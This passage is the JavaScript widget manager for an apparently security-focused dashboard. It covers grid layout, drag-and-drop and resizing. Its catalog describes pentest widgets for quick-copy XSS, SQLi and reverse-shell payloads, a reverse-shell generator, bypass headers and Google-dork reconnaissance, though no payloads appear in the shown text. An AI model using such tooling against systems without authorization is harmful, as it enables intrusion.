/**
 * Widgets Management System
 * Defines widget templates, rendering, dynamic addition, removal, reordering,
 * and multi-dimensional grid resizing (custom columns x rows, 1x1 to 4x5, full bar).
 */
const WidgetsManager = (() => {
  // Catalog of all widgets
  const WIDGET_CATALOG = {
    identity: {
      id: 'identity',
      title: 'Status',
      category: 'core',
      description: 'Operational readiness indicator.',
      defaultSize: { cols: 1, rows: 1 },
      render: renderIdentityWidget
    },
    clock: {
      id: 'clock',
      title: 'Clock',
      category: 'core',
      description: 'Digital clock with 12/24-hour display.',
      defaultSize: { cols: 1, rows: 1 },
      render: renderClockWidget
    },
    date: {
      id: 'date',
      title: 'Date',
      category: 'core',
      description: 'Current day, date, and month indicator.',
      defaultSize: { cols: 1, rows: 1 },
      render: renderDateWidget
    },
    quotes: {
      id: 'quotes',
      title: 'Quotes',
      category: 'core',
      description: 'Security and development principles.',
      defaultSize: { cols: 1, rows: 1 },
      render: renderQuotesWidget
    },
    todolist: {
      id: 'todolist',
      title: 'To-Do List',
      category: 'productivity',
      description: 'Target checklist and task manager.',
      defaultSize: { cols: 2, rows: 2 },
      render: renderTodoListWidget
    },
    payloads: {
      id: 'payloads',
      title: 'Payloads',
      category: 'tools',
      description: 'Quick-copy pentest payloads (XSS, SQLi, RevShells).',
      defaultSize: { cols: 2, rows: 2 },
      render: renderPayloadsWidget
    },
    encoder: {
      id: 'encoder',
      title: 'Encoder',
      category: 'tools',
      description: 'Base64, URL, Hex, and SHA-256 encoder.',
      defaultSize: { cols: 2, rows: 1 },
      render: renderEncoderWidget
    },
    commonports: {
      id: 'commonports',
      title: 'Ports',
      category: 'tools',
      description: 'Common ports and service cheatsheet.',
      defaultSize: { cols: 2, rows: 2 },
      render: renderCommonPortsWidget
    },
    subnets: {
      id: 'subnets',
      title: 'Subnets',
      category: 'tools',
      description: 'CIDR to mask and subnet calculator.',
      defaultSize: { cols: 1, rows: 2 },
      render: renderSubnetsWidget
    },
    cvss: {
      id: 'cvss',
      title: 'CVSS Calculator',
      category: 'tools',
      description: 'CVSS v3.1 severity calculator and vector generator.',
      defaultSize: { cols: 2, rows: 2 },
      render: renderCvssWidget
    },
    useragents: {
      id: 'useragents',
      title: 'User-Agent & Headers',
      category: 'tools',
      description: 'Quick-copy user agents and security bypass headers.',
      defaultSize: { cols: 2, rows: 2 },
      render: renderUserAgentsWidget
    },
    quicklinks: {
      id: 'quicklinks',
      title: 'Quick Links',
      category: 'tools',
      description: 'Direct bookmarks to pentest tools and resources.',
      defaultSize: { cols: 2, rows: 1 },
      render: renderQuicklinksWidget
    },
    notes: {
      id: 'notes',
      title: 'Notes',
      category: 'productivity',
      description: 'Scratchpad for target notes and credentials.',
      defaultSize: { cols: 2, rows: 1 },
      render: renderNotesWidget
    },
    countdown: {
      id: 'countdown',
      title: 'Countdown',
      category: 'productivity',
      description: 'Countdown timer for deadlines, CTFs, and focus sprints.',
      defaultSize: { cols: 2, rows: 1 },
      render: renderCountdownWidget
    },
    weather: {
      id: 'weather',
      title: 'Weather',
      category: 'info',
      description: 'Current weather and temperature monitor.',
      defaultSize: { cols: 1, rows: 1 },
      render: renderWeatherWidget
    },
    worldclock: {
      id: 'worldclock',
      title: 'World Clock',
      category: 'info',
      description: 'UTC, EST, GMT, and JST operational timezones.',
      defaultSize: { cols: 2, rows: 1 },
      render: renderWorldClockWidget
    },
    github: {
      id: 'github',
      title: 'GitHub',
      category: 'tools',
      description: 'Popular security tools and repositories.',
      defaultSize: { cols: 2, rows: 1 },
      render: renderGithubWidget
    },
    systemstatus: {
      id: 'systemstatus',
      title: 'System Status',
      category: 'core',
      description: 'Network connectivity and latency monitor.',
      defaultSize: { cols: 1, rows: 1 },
      render: renderSystemStatusWidget
    },
    revshells: {
      id: 'revshells',
      title: 'RevShells',
      category: 'tools',
      description: 'Reverse shell payload generator — revshells.com embedded.',
      defaultSize: { cols: 3, rows: 3 },
      render: renderRevShellsWidget
    },
    technews: {
      id: 'technews',
      title: 'Cyber & Tech News',
      category: 'info',
      description: 'Real-time cybersecurity headlines, threat intelligence, and tech news.',
      defaultSize: { cols: 2, rows: 2 },
      render: renderTechNewsWidget
    },
    googledorks: {
      id: 'googledorks',
      title: 'Google Dorks',
      category: 'tools',
      description: 'Interactive Google dork builder and OSINT reconnaissance library.',
      defaultSize: { cols: 2, rows: 2 },
      render: renderGoogleDorksWidget
    }
  };

  let activeWidgets = ['identity', 'clock', 'date', 'quotes'];
  let widgetSizes = {};
  let widgetPositions = {};
  let gridContainer = null;
  let addModal = null;
  let userSettings = {};
  let draggedWidgetId = null;
  let activeDropMesh = null;
  let isArrangeMode = false;
  let selectedCardId = null;
  let activeWidgetTimers = [];

  function clearActiveWidgetTimers() {
    activeWidgetTimers.forEach(id => clearInterval(id));
    activeWidgetTimers = [];
  }

  function registerWidgetInterval(fn, ms) {
    const id = setInterval(fn, ms);
    activeWidgetTimers.push(id);
    return id;
  }

  async function init(containerId, modalId, settings) {
    gridContainer = document.getElementById(containerId);
    addModal = document.getElementById(modalId);
    userSettings = settings || {};

    activeWidgets = (await StorageService.get('activeWidgets', ['identity', 'clock', 'date', 'quotes'])).filter(id => WIDGET_CATALOG[id]);
    widgetSizes = await StorageService.get('widgetSizes', {});
    widgetPositions = await StorageService.get('widgetPositions', {});

    // Enable Countdown widget seamlessly on first run if not yet initialized
    const hasAddedCountdown = await StorageService.get('hasAddedCountdownWidget', false);
    if (!hasAddedCountdown) {
      if (!activeWidgets.includes('countdown')) {
        activeWidgets.push('countdown');
        await StorageService.set('activeWidgets', activeWidgets);
      }
      await StorageService.set('hasAddedCountdownWidget', true);
    }

    ensureAllWidgetPositions();

    renderGrid();
    setupAddWidgetModal();
    setupArrangeModeControls();
    setupKeyboardShortcuts();
  }

  function normalizeDimension(size) {
    if (!size) return { cols: 1, rows: 1 };
    if (typeof size === 'object' && size.cols !== undefined && size.rows !== undefined) {
      return {
        cols: size.cols === 'full' ? 'full' : Math.min(4, Math.max(1, parseInt(size.cols, 10) || 1)),
        rows: Math.min(6, Math.max(1, parseInt(size.rows, 10) || 1))
      };
    }
    if (typeof size === 'string') {
      if (size === 'full') return { cols: 'full', rows: 1 };
      if (size === 'compact' || size === 'normal') return { cols: 1, rows: 1 };
      if (size === 'wide') return { cols: 2, rows: 1 };
      if (size === 'tall') return { cols: 1, rows: 2 };
      if (size === 'large') return { cols: 2, rows: 2 };
      const m = size.match(/^(\d+)x(\d+)$/i);
      if (m) {
        return {
          cols: Math.min(4, Math.max(1, parseInt(m[1], 10))),
          rows: Math.min(6, Math.max(1, parseInt(m[2], 10)))
        };
      }
    }
    return { cols: 1, rows: 1 };
  }

  function normalizePosition(widgetId, pos) {
    const def = WIDGET_CATALOG[widgetId];
    const dim = normalizeDimension(widgetSizes[widgetId] || (def ? def.defaultSize : { cols: 1, rows: 1 }));
    const spanCols = dim.cols === 'full' ? 4 : dim.cols;
    const maxCol = Math.max(1, 4 - spanCols + 1);

    if (!pos || typeof pos !== 'object') {
      return { col: 1, row: 1 };
    }
    const c = Math.min(maxCol, Math.max(1, parseInt(pos.col, 10) || 1));
    const r = Math.max(1, parseInt(pos.row, 10) || 1);
    return { col: c, row: r };
  }

  function getOccupiedGrid(excludeWidgetId = null) {
    const occupied = new Set();
    activeWidgets.forEach(id => {
      if (id === excludeWidgetId) return;
      const pos = widgetPositions[id];
      if (!pos) return;
      const def = WIDGET_CATALOG[id];
      const dim = normalizeDimension(widgetSizes[id] || (def ? def.defaultSize : { cols: 1, rows: 1 }));
      const spanCols = dim.cols === 'full' ? 4 : dim.cols;
      const spanRows = dim.rows;

      for (let c = pos.col; c < pos.col + spanCols && c <= 4; c++) {
        for (let r = pos.row; r < pos.row + spanRows; r++) {
          occupied.add(`${c},${r}`);
        }
      }
    });
    return occupied;
  }

  function findFirstAvailableSlot(widgetId, startCol = 1, startRow = 1) {
    const def = WIDGET_CATALOG[widgetId];
    const dim = normalizeDimension(widgetSizes[widgetId] || (def ? def.defaultSize : { cols: 1, rows: 1 }));
    const spanCols = dim.cols === 'full' ? 4 : dim.cols;
    const spanRows = dim.rows;
    const occupied = getOccupiedGrid(widgetId);

    const maxRowScan = 30;
    for (let r = startRow; r <= maxRowScan; r++) {
      const initC = (r === startRow) ? startCol : 1;
      for (let c = initC; c <= 4 - spanCols + 1; c++) {
        let fits = true;
        for (let sc = 0; sc < spanCols; sc++) {
          for (let sr = 0; sr < spanRows; sr++) {
            if (occupied.has(`${c + sc},${r + sr}`)) {
              fits = false;
              break;
            }
          }
          if (!fits) break;
        }
        if (fits) {
          return { col: c, row: r };
        }
      }
    }
    return { col: 1, row: startRow };
  }

  function ensureAllWidgetPositions() {
    let changed = false;
    activeWidgets.forEach((id) => {
      if (!widgetPositions[id]) {
        widgetPositions[id] = findFirstAvailableSlot(id);
        changed = true;
      } else {
        const norm = normalizePosition(id, widgetPositions[id]);
        if (norm.col !== widgetPositions[id].col || norm.row !== widgetPositions[id].row) {
          widgetPositions[id] = norm;
          changed = true;
        }
      }
    });
    if (changed) {
      StorageService.set('widgetPositions', widgetPositions);
    }
  }

  async function setWidgetPosition(widgetId, col, row) {
    const norm = normalizePosition(widgetId, { col, row });
    widgetPositions[widgetId] = norm;
    await StorageService.set('widgetPositions', widgetPositions);
    renderGrid();
  }

  async function nudgeWidget(widgetId, deltaCol, deltaRow) {
    const current = widgetPositions[widgetId] || { col: 1, row: 1 };
    const def = WIDGET_CATALOG[widgetId];
    const dim = normalizeDimension(widgetSizes[widgetId] || (def ? def.defaultSize : { cols: 1, rows: 1 }));
    const spanCols = dim.cols === 'full' ? 4 : dim.cols;
    const maxCol = Math.max(1, 4 - spanCols + 1);

    const targetCol = Math.min(maxCol, Math.max(1, current.col + deltaCol));
    const targetRow = Math.max(1, current.row + deltaRow);

    await setWidgetPosition(widgetId, targetCol, targetRow);
  }

  function applyDimensionToCard(card, dim, pos) {
    const norm = normalizeDimension(dim);
    card.dataset.cols = String(norm.cols);
    card.dataset.rows = String(norm.rows);
    card.dataset.size = norm.cols === 'full' ? 'full' : `${norm.cols}x${norm.rows}`;

    if (pos && pos.col && pos.row) {
      if (norm.cols === 'full' || norm.cols >= 4) {
        card.style.gridColumn = '1 / -1';
      } else {
        card.style.gridColumn = `${pos.col} / span ${norm.cols}`;
      }
      card.style.gridRow = `${pos.row} / span ${norm.rows}`;
      card.dataset.col = String(pos.col);
      card.dataset.row = String(pos.row);
    } else {
      if (norm.cols === 'full' || norm.cols >= 4) {
        card.style.gridColumn = '1 / -1';
      } else {
        card.style.gridColumn = `span ${norm.cols}`;
      }
      card.style.gridRow = `span ${norm.rows}`;
    }
  }

  function getWidgetAtCell(col, row, excludeId = null) {
    for (const id of activeWidgets) {
      if (id === excludeId) continue;
      const p = widgetPositions[id];
      if (!p) continue;
      const dim = normalizeDimension(widgetSizes[id] || (WIDGET_CATALOG[id]?.defaultSize || { cols: 1, rows: 1 }));
      const spanCols = dim.cols === 'full' ? 4 : dim.cols;
      const spanRows = dim.rows;
      if (col >= p.col && col < p.col + spanCols && row >= p.row && row < p.row + spanRows) {
        return id;
      }
    }
    return null;
  }

  async function compactLayout() {
    const sorted = [...activeWidgets].sort((a, b) => {
      const posA = widgetPositions[a] || { col: 1, row: 99 };
      const posB = widgetPositions[b] || { col: 1, row: 99 };
      if (posA.row !== posB.row) return posA.row - posB.row;
      return posA.col - posB.col;
    });

    widgetPositions = {};
    sorted.forEach(id => {
      widgetPositions[id] = findFirstAvailableSlot(id, 1, 1);
    });
    await StorageService.set('widgetPositions', widgetPositions);
    renderGrid();
  }

  function toggleArrangeMode() {
    isArrangeMode = !isArrangeMode;
    if (!isArrangeMode) {
      selectedCardId = null;
    }
    updateArrangeModeUI();
    renderGrid();
  }

  function updateArrangeModeUI() {
    const banner = document.getElementById('arrange-mode-banner');
    const toggleBtn = document.getElementById('toggle-arrange-grid-btn');
    if (banner) {
      banner.style.display = isArrangeMode ? 'flex' : 'none';
    }
    if (toggleBtn) {
      toggleBtn.classList.toggle('is-active', isArrangeMode);
    }
    if (gridContainer) {
      gridContainer.classList.toggle('is-arrange-mode', isArrangeMode);
    }
  }

  function setupArrangeModeControls() {
    const toggleBtn = document.getElementById('toggle-arrange-grid-btn');
    const compactBtn = document.getElementById('arrange-compact-btn');
    const resetBtn = document.getElementById('arrange-reset-btn');
    const doneBtn = document.getElementById('arrange-done-btn');

    if (toggleBtn) {
      toggleBtn.addEventListener('click', () => {
        toggleArrangeMode();
      });
    }

    if (compactBtn) {
      compactBtn.addEventListener('click', () => {
        compactLayout();
      });
    }

    if (resetBtn) {
      resetBtn.addEventListener('click', () => {
        resetLayout();
      });
    }

    if (doneBtn) {
      doneBtn.addEventListener('click', () => {
        if (isArrangeMode) toggleArrangeMode();
      });
    }
  }

  function setupKeyboardShortcuts() {
    window.addEventListener('keydown', async (e) => {
      if (!isArrangeMode) return;
      if (e.target && typeof e.target.closest === 'function' && e.target.closest('input, textarea, select')) return;

      if (e.key === 'Escape') {
        if (selectedCardId) {
          selectedCardId = null;
          document.querySelectorAll('.widget-card.is-selected').forEach(c => c.classList.remove('is-selected'));
        } else {
          toggleArrangeMode();
        }
        return;
      }

      if (!selectedCardId) return;

      if (e.key === 'ArrowLeft') {
        e.preventDefault();
        if (e.shiftKey) {
          const dim = normalizeDimension(widgetSizes[selectedCardId] || WIDGET_CATALOG[selectedCardId]?.defaultSize);
          const newCols = dim.cols === 'full' ? 3 : Math.max(1, dim.cols - 1);
          const cardEl = gridContainer.querySelector(`.widget-${selectedCardId}`);
          await setWidgetDimension(selectedCardId, cardEl, newCols, dim.rows);
        } else {
          nudgeWidget(selectedCardId, -1, 0);
        }
      } else if (e.key === 'ArrowRight') {
        e.preventDefault();
        if (e.shiftKey) {
          const dim = normalizeDimension(widgetSizes[selectedCardId] || WIDGET_CATALOG[selectedCardId]?.defaultSize);
          const newCols = dim.cols === 'full' ? 4 : Math.min(4, dim.cols + 1);
          const cardEl = gridContainer.querySelector(`.widget-${selectedCardId}`);
          await setWidgetDimension(selectedCardId, cardEl, newCols, dim.rows);
        } else {
          nudgeWidget(selectedCardId, 1, 0);
        }
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (e.shiftKey) {
          const dim = normalizeDimension(widgetSizes[selectedCardId] || WIDGET_CATALOG[selectedCardId]?.defaultSize);
          const newRows = Math.max(1, dim.rows - 1);
          const cardEl = gridContainer.querySelector(`.widget-${selectedCardId}`);
          await setWidgetDimension(selectedCardId, cardEl, dim.cols, newRows);
        } else {
          nudgeWidget(selectedCardId, 0, -1);
        }
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (e.shiftKey) {
          const dim = normalizeDimension(widgetSizes[selectedCardId] || WIDGET_CATALOG[selectedCardId]?.defaultSize);
          const newRows = Math.min(6, dim.rows + 1);
          const cardEl = gridContainer.querySelector(`.widget-${selectedCardId}`);
          await setWidgetDimension(selectedCardId, cardEl, dim.cols, newRows);
        } else {
          nudgeWidget(selectedCardId, 0, 1);
        }
      } else if (e.key === 'Delete' || e.key === 'Backspace') {
        e.preventDefault();
        const idToRemove = selectedCardId;
        selectedCardId = null;
        await removeWidget(idToRemove);
      }
    });
  }

  /* =========================================================
     FREEFORM POINTER DRAG & DROP ENGINE (PLACE ANYWHERE)
     ========================================================= */

  function initCardDrag(card, header, widgetId) {
    header.addEventListener('pointerdown', (e) => {
      if (e.target.closest('button, a, input, select, textarea, .widget-ctrl-btn, .widget-resize-handle')) return;
      if (e.button !== 0) return; // Left mouse click only

      e.preventDefault();

      const startX = e.clientX;
      const startY = e.clientY;
      let isDragging = false;
      let placeholder = null;

      const startRect = card.getBoundingClientRect();
      const offsetX = startX - startRect.left;
      const offsetY = startY - startRect.top;

      const currentPos = widgetPositions[widgetId] || { col: 1, row: 1 };
      const dim = normalizeDimension(widgetSizes[widgetId] || (WIDGET_CATALOG[widgetId]?.defaultSize || { cols: 1, rows: 1 }));
      const spanCols = dim.cols === 'full' ? 4 : dim.cols;
      const spanRows = dim.rows;

      let targetCol = currentPos.col;
      let targetRow = currentPos.row;

      function onPointerMove(moveEvent) {
        const dx = moveEvent.clientX - startX;
        const dy = moveEvent.clientY - startY;

        if (!isDragging) {
          if (Math.hypot(dx, dy) < 6) return;
          isDragging = true;
          document.body.style.userSelect = 'none';
          document.body.style.cursor = 'grabbing';

          card.classList.add('is-dragging-card');
          card.style.position = 'fixed';
          card.style.width = `${startRect.width}px`;
          card.style.height = `${startRect.height}px`;
          card.style.left = `${moveEvent.clientX - offsetX}px`;
          card.style.top = `${moveEvent.clientY - offsetY}px`;
          card.style.zIndex = '99999';
          card.style.pointerEvents = 'none';

          placeholder = document.createElement('div');
          placeholder.className = 'grid-drop-placeholder';
          placeholder.innerHTML = `<span class="placeholder-label">${WIDGET_CATALOG[widgetId]?.title || 'Widget'}</span>`;
          updatePlaceholder();
          gridContainer.appendChild(placeholder);
        }

        card.style.left = `${moveEvent.clientX - offsetX}px`;
        card.style.top = `${moveEvent.clientY - offsetY}px`;

        const gRect = gridContainer.getBoundingClientRect();
        const colWidth = (gRect.width - (16 * 3)) / 4;
        const rowHeight = 140;
        const gap = 16;
        const relX = moveEvent.clientX - gRect.left;
        const relY = moveEvent.clientY - gRect.top;

        const maxCol = Math.max(1, 4 - spanCols + 1);
        const computedCol = Math.round((relX - offsetX + (colWidth * 0.5)) / (colWidth + gap)) + 1;
        targetCol = Math.min(maxCol, Math.max(1, computedCol));

        const computedRow = Math.max(1, Math.floor((relY - offsetY + (rowHeight * 0.3)) / (rowHeight + gap)) + 1);
        targetRow = computedRow;

        updatePlaceholder();
      }

      function updatePlaceholder() {
        if (!placeholder) return;
        if (spanCols >= 4) {
          placeholder.style.gridColumn = '1 / -1';
        } else {
          placeholder.style.gridColumn = `${targetCol} / span ${spanCols}`;
        }
        placeholder.style.gridRow = `${targetRow} / span ${spanRows}`;
        const label = placeholder.querySelector('.placeholder-label');
        if (label) {
          label.textContent = `${WIDGET_CATALOG[widgetId]?.title || 'Widget'} (Col ${targetCol}, Row ${targetRow})`;
        }
      }

      async function onPointerUp() {
        window.removeEventListener('pointermove', onPointerMove);
        window.removeEventListener('pointerup', onPointerUp);
        window.removeEventListener('pointercancel', onPointerUp);

        document.body.style.userSelect = '';
        document.body.style.cursor = '';

        if (isDragging) {
          card.classList.remove('is-dragging-card');
          card.style.position = '';
          card.style.width = '';
          card.style.height = '';
          card.style.left = '';
          card.style.top = '';
          card.style.zIndex = '';
          card.style.pointerEvents = '';

          if (placeholder && placeholder.parentNode) {
            placeholder.parentNode.removeChild(placeholder);
          }

          // Check if landing over an existing widget: swap cleanly
          const otherId = getWidgetAtCell(targetCol, targetRow, widgetId);
          if (otherId && otherId !== widgetId) {
            const oldPos = { ...(widgetPositions[widgetId] || { col: 1, row: 1 }) };
            const otherPos = { ...(widgetPositions[otherId] || { col: targetCol, row: targetRow }) };
            widgetPositions[widgetId] = otherPos;
            widgetPositions[otherId] = oldPos;
          } else {
            widgetPositions[widgetId] = { col: targetCol, row: targetRow };
          }

          await StorageService.set('widgetPositions', widgetPositions);
          renderGrid();
        }
      }

      window.addEventListener('pointermove', onPointerMove);
      window.addEventListener('pointerup', onPointerUp);
      window.addEventListener('pointercancel', onPointerUp);
    });
  }

  /* =========================================================
     LIVE CORNER DRAG & CLICK RESIZE ENGINE
     ========================================================= */

  const POPULAR_SPANS = [
    { cols: 1, rows: 1 },
    { cols: 2, rows: 1 },
    { cols: 1, rows: 2 },
    { cols: 2, rows: 2 },
    { cols: 4, rows: 2 }
  ];

  async function cycleNextSize(widgetId, cardElement) {
    const cur = normalizeDimension(widgetSizes[widgetId] || (WIDGET_CATALOG[widgetId] ? WIDGET_CATALOG[widgetId].defaultSize : { cols: 1, rows: 1 }));
    let curIndex = POPULAR_SPANS.findIndex(p => p.cols === cur.cols && p.rows === cur.rows);
    let nextIndex = (curIndex + 1) % POPULAR_SPANS.length;
    const nextDim = POPULAR_SPANS[nextIndex];
    await setWidgetDimension(widgetId, cardElement, nextDim.cols, nextDim.rows);
  }

  async function setWidgetDimension(widgetId, cardElement, cols, rows) {
    const dim = { cols, rows };
    const curPos = widgetPositions[widgetId] || { col: 1, row: 1 };
    const spanCols = cols === 'full' ? 4 : parseInt(cols, 10);
    if (curPos.col + spanCols - 1 > 4) {
      curPos.col = Math.max(1, 4 - spanCols + 1);
      widgetPositions[widgetId] = curPos;
      await StorageService.set('widgetPositions', widgetPositions);
    }
    widgetSizes[widgetId] = cols === 'full' ? { cols: 'full', rows } : { cols: parseInt(cols, 10), rows: parseInt(rows, 10) };
    await StorageService.set('widgetSizes', widgetSizes);
    applyDimensionToCard(cardElement, dim, curPos);
    postRenderInit();
  }

  function initResizeHandleEvents(handle, widgetId, cardElement) {
    handle.addEventListener('pointerdown', (e) => {
      e.stopPropagation();
      e.preventDefault();
      if (e.button !== 0) return;

      const startX = e.clientX;
      const startY = e.clientY;
      const cur = normalizeDimension(widgetSizes[widgetId] || (WIDGET_CATALOG[widgetId] ? WIDGET_CATALOG[widgetId].defaultSize : { cols: 1, rows: 1 }));
      let startCols = cur.cols === 'full' ? 4 : cur.cols;
      let startRows = cur.rows;
      let currentCols = startCols;
      let currentRows = startRows;
      let hasMoved = false;

      cardElement.classList.add('is-resizing');
      document.body.style.userSelect = 'none';
      document.body.style.cursor = 'nwse-resize';

      const badge = document.createElement('div');
      badge.className = 'resize-dimension-badge';
      badge.textContent = `${startCols} × ${startRows}`;
      cardElement.appendChild(badge);

      const gRect = gridContainer.getBoundingClientRect();
      const colStep = (gRect.width - (16 * 3)) / 4;
      const rowStep = 140;

      function onPointerMove(moveEvent) {
        const deltaX = moveEvent.clientX - startX;
        const deltaY = moveEvent.clientY - startY;

        if (Math.abs(deltaX) > 8 || Math.abs(deltaY) > 8) {
          hasMoved = true;
        }

        const colChange = Math.round(deltaX / colStep);
        const rowChange = Math.round(deltaY / rowStep);

        const pos = widgetPositions[widgetId] || { col: 1, row: 1 };
        const maxColsAllowed = Math.max(1, 4 - pos.col + 1);

        currentCols = Math.min(maxColsAllowed, Math.max(1, startCols + colChange));
        currentRows = Math.min(6, Math.max(1, startRows + rowChange));

        applyDimensionToCard(cardElement, { cols: currentCols, rows: currentRows }, pos);
        badge.textContent = `${currentCols} × ${currentRows}`;
      }

      async function onPointerUp() {
        window.removeEventListener('pointermove', onPointerMove);
        window.removeEventListener('pointerup', onPointerUp);
        window.removeEventListener('pointercancel', onPointerUp);

        document.body.style.userSelect = '';
        document.body.style.cursor = '';
        cardElement.classList.remove('is-resizing');

        if (badge && badge.parentNode) {
          badge.parentNode.removeChild(badge);
        }

        if (!hasMoved) {
          cycleNextSize(widgetId, cardElement);
        } else {
          widgetSizes[widgetId] = { cols: currentCols, rows: currentRows };
          await StorageService.set('widgetSizes', widgetSizes);
          postRenderInit();
        }
      }

      window.addEventListener('pointermove', onPointerMove);
      window.addEventListener('pointerup', onPointerUp);
      window.addEventListener('pointercancel', onPointerUp);
    });
  }

  /* =========================================================
     MAIN GRID RENDERER
     ========================================================= */

  function renderGrid() {
    if (!gridContainer) return;
    clearActiveWidgetTimers();
    gridContainer.innerHTML = '';

    ensureAllWidgetPositions();
    updateArrangeModeUI();

    activeWidgets.forEach((widgetId, index) => {
      const def = WIDGET_CATALOG[widgetId];
      if (!def) return;

      const card = document.createElement('div');
      card.className = `widget-card widget-${widgetId}`;
      if (isArrangeMode && selectedCardId === widgetId) {
        card.classList.add('is-selected');
      }

      const currentDim = widgetSizes[widgetId] || def.defaultSize;
      const currentPos = widgetPositions[widgetId] || { col: 1, row: 1 };
      applyDimensionToCard(card, currentDim, currentPos);
      card.dataset.widgetId = widgetId;
      card.dataset.index = index;

      // Card selection in Arrange Mode
      card.addEventListener('click', (e) => {
        if (!isArrangeMode) return;
        if (e.target.closest('button, input, select, textarea, .widget-resize-handle, a')) return;
        selectedCardId = selectedCardId === widgetId ? null : widgetId;
        document.querySelectorAll('.widget-card').forEach(c => {
          c.classList.toggle('is-selected', c.dataset.widgetId === selectedCardId);
        });
      });

      // Minimalist Card Header
      const header = document.createElement('div');
      header.className = 'widget-header';

      // Left: Drag Grip Handle + Title
      const headerLeft = document.createElement('div');
      headerLeft.className = 'widget-header-left';
      headerLeft.title = 'Drag to place anywhere on grid';

      const dragHandle = document.createElement('span');
      dragHandle.className = 'widget-drag-handle';
      dragHandle.innerHTML = `
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
          <circle cx="9" cy="5" r="1.5"></circle>
          <circle cx="9" cy="12" r="1.5"></circle>
          <circle cx="9" cy="19" r="1.5"></circle>
          <circle cx="15" cy="5" r="1.5"></circle>
          <circle cx="15" cy="12" r="1.5"></circle>
          <circle cx="15" cy="19" r="1.5"></circle>
        </svg>
      `;

      const titleSpan = document.createElement('span');
      titleSpan.className = 'widget-title';
      titleSpan.textContent = def.title;

      headerLeft.appendChild(dragHandle);
      headerLeft.appendChild(titleSpan);

      // Right Controls: Resize Cycle + Remove
      const controls = document.createElement('div');
      controls.className = 'widget-controls';

      const resizeCycleBtn = document.createElement('button');
      resizeCycleBtn.className = 'widget-ctrl-btn widget-resize-cycle-btn';
      resizeCycleBtn.type = 'button';
      resizeCycleBtn.title = 'Cycle size (Compact, Wide, Tall, Large, Full)';
      resizeCycleBtn.innerHTML = `
        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="15 3 21 3 21 9"></polyline>
          <polyline points="9 21 3 21 3 15"></polyline>
          <line x1="21" y1="3" x2="14" y2="10"></line>
          <line x1="3" y1="21" x2="10" y2="14"></line>
        </svg>
      `;
      resizeCycleBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        cycleNextSize(widgetId, card);
      });
      controls.appendChild(resizeCycleBtn);

      const removeBtn = document.createElement('button');
      removeBtn.className = 'widget-ctrl-btn widget-remove-btn';
      removeBtn.type = 'button';
      removeBtn.title = 'Remove widget';
      removeBtn.innerHTML = '&times;';
      removeBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        removeWidget(widgetId);
      });
      controls.appendChild(removeBtn);

      header.appendChild(headerLeft);
      header.appendChild(controls);
      card.appendChild(header);

      // Content Container
      const content = document.createElement('div');
      content.className = 'widget-content';
      def.render(content, userSettings);
      card.appendChild(content);

      // Corner Resize Grip Handle
      const resizeHandle = document.createElement('div');
      resizeHandle.className = 'widget-resize-handle';
      resizeHandle.title = 'Drag corner to resize or click to cycle size';
      resizeHandle.innerHTML = `
        <svg width="10" height="10" viewBox="0 0 10 10">
          <line x1="9" y1="1" x2="1" y2="9" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
          <line x1="9" y1="5" x2="5" y2="9" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
        </svg>
      `;
      initResizeHandleEvents(resizeHandle, widgetId, card);
      card.appendChild(resizeHandle);

      // Enable Smooth Pointer Drag & Drop on Header
      initCardDrag(card, header, widgetId);

      gridContainer.appendChild(card);
    });

    postRenderInit();
  }

  function postRenderInit() {
    // Clock
    const clockContainer = gridContainer.querySelector('.widget-clock .widget-content');
    if (clockContainer && typeof ClockWidget !== 'undefined') {
      ClockWidget.init(clockContainer, userSettings.clockFormat || '12');
    }

    // Date
    const dateContainer = gridContainer.querySelector('.widget-date .widget-content');
    if (dateContainer && typeof DateWidget !== 'undefined') {
      DateWidget.init(dateContainer);
    }

    // Quotes
    const quotesContainer = gridContainer.querySelector('.widget-quotes .widget-content');
    if (quotesContainer && typeof QuotesWidget !== 'undefined') {
      QuotesWidget.init(quotesContainer, userSettings.quoteCategory || 'all');
    }

    // Notes auto-save
    const notesArea = gridContainer.querySelector('.notes-textarea');
    if (notesArea) {
      notesArea.addEventListener('input', () => {
        StorageService.set('notesContent', notesArea.value);
      });
    }

    // Countdown logic
    initCountdownTimer();
  }

  // ==========================================
  // WIDGET RENDERERS
  // ==========================================

  function renderIdentityWidget(container) {
    container.innerHTML = `
      <div class="identity-wrapper" title="Click to toggle Red Team / VAPT mode">
        <div class="orb-container">
          <div class="orb-core"></div>
          <div class="orb-ring ring-1"></div>
          <div class="orb-ring ring-2"></div>
        </div>
        <div class="identity-info">
          <span class="identity-tag" id="identity-mode-text">RED TEAM</span>
          <span class="identity-subtag"><span class="status-dot"></span>OPERATIONAL</span>
        </div>
      </div>
    `;

    const wrapper = container.querySelector('.identity-wrapper');
    const tag = container.querySelector('#identity-mode-text');
    if (wrapper && tag) {
      wrapper.addEventListener('click', () => {
        tag.textContent = tag.textContent === 'RED TEAM' ? 'VAPT' : 'RED TEAM';
      });
    }
  }

  function renderClockWidget(container) {
    container.innerHTML = `
      <div class="clock-display">
        <div class="clock-digits">12:00</div>
        <div class="clock-meta">
          <span class="clock-ampm">PM</span>
          <span class="clock-seconds">:00</span>
        </div>
      </div>
    `;
  }

  function renderDateWidget(container) {
    container.innerHTML = `
      <div class="date-stack">
        <span class="date-dayname">MON</span>
        <span class="date-daynum">05</span>
        <span class="date-month">OCT</span>
      </div>
    `;
  }

  function renderQuotesWidget(container) {
    const copySvg = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
    container.innerHTML = `
      <div class="quote-wrapper">
        <div class="quote-header-mini">
          <button class="quote-copy-btn" title="Copy principle to clipboard">${copySvg}</button>
        </div>
        <p class="quote-text">"A hidden endpoint is not an access control."</p>
